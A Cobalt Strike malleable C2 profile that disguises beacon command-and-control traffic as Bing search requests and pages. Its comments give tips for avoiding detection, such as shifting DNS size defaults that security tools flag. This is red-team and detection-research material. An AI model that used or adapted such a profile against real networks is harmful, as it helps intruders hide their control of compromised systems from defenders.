https-certificate {
    set keystore "";
    set password "";
}

https-certificate {
    set CN       "";
    set O        "";
    set C        "";
    set L        "";
    set OU       "";
    set ST       "";
    set validity "";
}

# sleeptime given in milliseconds
set sleeptime "48000";
set jitter    "65";
# User-Agent String is for Chrome 60 on Windows 10
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36";
# Change DNS to non-Google; preferably something client uses...
set dns_idle "8.8.4.4";
# default value for CS is 255, but many sec tools flag on '255'
set maxdns    "238";

# REFERENCE: https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/

http-get {

# if your request contains a '?' prior to query, don't put it... CS automatically inserts it
    set uri "/search/";

# byte size of client section must be under 252 bytes; count of this blank section is ~166 bytes
    client {

        header "Host" "";
        header "Accept" "";
        header "Cookie" ""; 
        
        metadata {
            base64url;
            parameter "";
        }

        parameter "go" "Search";
        parameter "qs" "bs";
# this value needs to be in the output-preprend...
# the 'QBRE' value is what will get replaced by CS beacon info...
        parameter "form" "QBRE";


    }

    server {

        header "Cache-Control" "";
        header "Content-Type" "";
        header "Vary" "";
        header "Server" "";
        header "Connection" "";
        

        output {
            netbios;
# make sure to escape all double-quotes...
# replace any '\b' characters, or other stuff that might be interpreted as REGEX...
            prepend "<!DOCTYPE html><html lang=\"en\" xml:lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:Web=\"http://schemas.live.com/Web/\"><script type=\"text/javascript\">//<![CDATA[si_ST=new Date;//]]></script><head><!--pc--><title>Bing</title><meta content=\"text/html; charset=utf-8\" http-equiv=\"content-type\" /><link href=\"/search?format=rss&amp;q=canary&amp;go=Search&amp;qs=bs&amp;form=QBRE\" rel=\"alternate\" title=\"XML\" type=\"text/xml\" /><link href=\"/search?format=rss&amp;q=canary&amp;go=Search&amp;qs=bs&amp;form=QBRE\" rel=\"alternate\" title=\"RSS\" type=\"application/rss+xml\" /><link href=\"/sa/simg/bing_p_rr_teal_min.ico\" rel=\"shortcut icon\" /><script type=\"text/javascript\">//<![CDATA[";
            append "G={ST:(si_ST?si_ST:new Date),Mkt:\"en-US\",RTL:false,Ver:\"53\",IG:\"4C1158CCBAFC4896AD78ED0FF0F4A1B2\",EventID:\"E37FA2E804B54C71B3E275E9589590F8\",MN:\"SERP\",V:\"web\",P:\"SERP\",DA:\"CO4\",SUIH:\"OBJhNcrOC72Z3mr21coFQw\",gpUrl:\"/fd/ls/GLinkPing.aspx?\" }; _G.lsUrl=\"/fd/ls/l?IG=\"+_G.IG ;curUrl=\"http://www.bing.com/search\";function si_T(a){ if(document.images){_G.GPImg=new Image;_G.GPImg.src=_G.gpUrl+\"IG=\"+_G.IG+\"&\"+a;}return true;};//]]></script><style type=\"text/css\">.sw_ddbk:after,.sw_ddw:after,.sw_ddgn:after,.sw_poi:after,.sw_poia:after,.sw_play:after,.sw_playa:after,.sw_playd:after,.sw_playp:after,.sw_st:after,.sw_sth:after,.sw_ste:after,.sw_st2:after,.sw_plus:after,.sw_tpcg:after,.sw_tpcw:after,.sw_tpcbk:after,.sw_arwh:after,.sb_pagN:after,.sb_pagP:after,.sw_up:after,.sw_down:after,.b_expandToggle:after,.sw_calc:after,.sw_fbi:after,";
            print;
        }
    }
}

http-post {

# this value cannot perfectly match http-get request... just change case or something
    set uri "/Search/";
    set verb "GET";

    client {

        header "Host" "";
        header "Accept" "";
        header "Cookie" ""; 
        
        output {
            base64url;
            parameter "q";
        }
        
        parameter "go" "Search";
        parameter "qs" "bs";
        
        id {
            base64url;
            parameter "form";
        }
    }

    server {

        header "Cache-Control" "";
        header "Content-Type" "";
        header "Vary" "";
        header "Server" "";
        header "Connection" "";
        

        output {
            netbios;
            prepend "<!DOCTYPE html><html lang=\"en\" xml:lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:Web=\"http://schemas.live.com/Web/\"><script type=\"text/javascript\">//<![CDATA[si_ST=new Date;//]]></script><head><!--pc--><title>Bing</title><meta content=\"text/html; charset=utf-8\" http-equiv=\"content-type\" /><link href=\"/search?format=rss&amp;q=canary&amp;go=Search&amp;qs=bs&amp;form=QBRE\" rel=\"alternate\" title=\"XML\" type=\"text/xml\" /><link href=\"/search?format=rss&amp;q=canary&amp;go=Search&amp;qs=bs&amp;form=QBRE\" rel=\"alternate\" title=\"RSS\" type=\"application/rss+xml\" /><link href=\"/sa/simg/bing_p_rr_teal_min.ico\" rel=\"shortcut icon\" /><script type=\"text/javascript\">//<![CDATA[";
            append "G={ST:(si_ST?si_ST:new Date),Mkt:\"en-US\",RTL:false,Ver:\"53\",IG:\"4C1158CCBAFC4896AD78ED0FF0F4A1B2\",EventID:\"E37FA2E804B54C71B3E275E9589590F8\",MN:\"SERP\",V:\"web\",P:\"SERP\",DA:\"CO4\",SUIH:\"OBJhNcrOC72Z3mr21coFQw\",gpUrl:\"/fd/ls/GLinkPing.aspx?\" }; _G.lsUrl=\"/fd/ls/l?IG=\"+_G.IG ;curUrl=\"http://www.bing.com/search\";function si_T(a){ if(document.images){_G.GPImg=new Image;_G.GPImg.src=_G.gpUrl+\"IG=\"+_G.IG+\"&\"+a;}return true;};//]]></script><style type=\"text/css\">.sw_ddbk:after,.sw_ddw:after,.sw_ddgn:after,.sw_poi:after,.sw_poia:after,.sw_play:after,.sw_playa:after,.sw_playd:after,.sw_playp:after,.sw_st:after,.sw_sth:after,.sw_ste:after,.sw_st2:after,.sw_plus:after,.sw_tpcg:after,.sw_tpcw:after,.sw_tpcbk:after,.sw_arwh:after,.sb_pagN:after,.sb_pagP:after,.sw_up:after,.sw_down:after,.b_expandToggle:after,.sw_calc:after,.sw_fbi:after,";
            print;
        }
    }
}